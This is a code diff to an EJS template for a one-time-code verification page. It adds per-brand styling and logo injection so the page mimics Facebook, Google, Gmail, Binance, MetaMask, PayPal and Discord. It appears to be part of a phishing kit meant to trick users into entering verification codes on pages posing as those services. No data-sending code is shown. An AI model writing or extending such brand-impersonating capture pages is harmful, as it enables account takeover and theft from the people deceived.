@@ -11,6 +11,7 @@
   body { font-family:'Cairo',system-ui; background:var(--bg); color:var(--fg); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:24px; }
   .auth { background:var(--card); border-radius:20px; padding:36px 28px; width:100%; max-width:440px; }
   .logo { width:56px; height:56px; border-radius:16px; background:linear-gradient(135deg,var(--accent),var(--accent2)); display:flex; align-items:center; justify-content:center; color:#fff; font-weight:800; font-size:1.6rem; margin:0 auto 24px; }
+  .logo-svg { display:block; margin:0 auto 24px; }
   h1 { font-size:1.3rem; text-align:center; margin-bottom:6px; font-weight:800; }
   .sub { text-align:center; font-size:.9rem; opacity:.75; margin-bottom:22px; }
   .otp-wrap { display:flex; gap:8px; justify-content:center; margin:22px 0; }
@@ -19,11 +20,38 @@
   button { padding:15px; border:0; border-radius:12px; background:linear-gradient(135deg,var(--accent),var(--accent2)); color:#fff; font-size:1.05rem; font-weight:800; cursor:pointer; font-family:inherit; width:100%; }
   button:disabled { opacity:.5; cursor:not-allowed; }
   .timer { color:var(--accent); font-weight:700; }
+
+  body.brand-facebook { background:#f0f2f5; color:#1c1e21; }
+  body.brand-facebook .auth { background:#fff; border:none; box-shadow:0 2px 4px rgba(0,0,0,.1); border-radius:8px; }
+  body.brand-facebook .otp-wrap input { background:#fff; border:1px solid #dddfe2; color:#1c1e21; }
+  body.brand-facebook button { background:#1877F2; background-image:none; border-radius:6px; }
+  body.brand-google, body.brand-gmail { background:#fff; color:#202124; }
+  body.brand-google .auth, body.brand-gmail .auth { background:#fff; border:1px solid #dadce0; box-shadow:none; border-radius:8px; }
+  body.brand-google .otp-wrap input, body.brand-gmail .otp-wrap input { background:#fff; border:1px solid #dadce0; color:#202124; }
+  body.brand-google button, body.brand-gmail button { background:#1a73e8; background-image:none; border-radius:4px; }
+  body.brand-binance { background:#181A20; color:#eaecef; }
+  body.brand-binance .auth { background:#1e2026; border:1px solid #2e3340; border-radius:8px; }
+  body.brand-binance .otp-wrap input { background:#2b2f36; border:1px solid #474d57; color:#eaecef; }
+  body.brand-binance button { background:#F0B90B; color:#1a1a1a; background-image:none; border-radius:4px; }
+  body.brand-metamask { background:#24272A; }
+  body.brand-metamask .auth { background:#1c1f22; border:1px solid #3c4044; }
+  body.brand-metamask button { background:#F6851B; background-image:none; border-radius:8px; }
+  body.brand-paypal { background:#0070ba; }
+  body.brand-paypal .auth { background:#fff; color:#2c2e2f; border-radius:6px; }
+  body.brand-paypal button { background:#0070ba; background-image:none; border-radius:25px; }
+  body.brand-discord { background:#5865F2; }
+  body.brand-discord .auth { background:#36393f; border-radius:5px; }
+  body.brand-discord .otp-wrap input { background:#40444b; border:none; color:#dcddde; }
+  body.brand-discord button { background:#5865F2; background-image:none; border-radius:3px; }
 </style>
 </head>
-<body>
+<body class="brand-<%= tpl.key || tpl.name.toLowerCase().replace(/[^a-z0-9]/g,'') %>">
 <div class="auth">
-  <div class="logo"><%= tpl.name.charAt(0) %></div>
+  <% if (typeof logos !== 'undefined' && logos[tpl.key]) { %>
+    <div class="logo-svg"><%- logos[tpl.key] %></div>
+  <% } else { %>
+    <div class="logo"><%= tpl.name.charAt(0) %></div>
+  <% } %>
   <h1><%= pageContent.headline %></h1>
   <p class="sub"><%= pageContent.subheadline %></p>
 
